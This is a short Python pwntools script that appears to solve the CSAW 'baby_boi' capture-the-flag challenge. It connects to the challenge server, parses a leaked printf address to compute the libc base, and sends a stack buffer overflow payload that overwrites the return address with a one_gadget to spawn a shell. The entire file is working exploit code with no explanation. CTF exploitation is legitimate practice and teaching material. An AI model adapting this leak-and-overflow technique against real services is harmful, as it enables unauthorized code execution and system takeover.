from pwn import *

# p=process('./baby_boi')
p=remote('pwn.chal.csaw.io',1005)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.27.so')

# gdb.attach(p)
p.recvuntil('am: ')

printf_got = int(p.recvline()[:-1],16)

libc_base = printf_got - libc.symbols['printf']

log.info('Libc: 0x{:x}'.format(libc_base))

one_gadget = libc_base + 0x4f322

payload = 'A'*(0x20+8)

payload+=p64(one_gadget)

p.sendline(payload)

p.interactive()
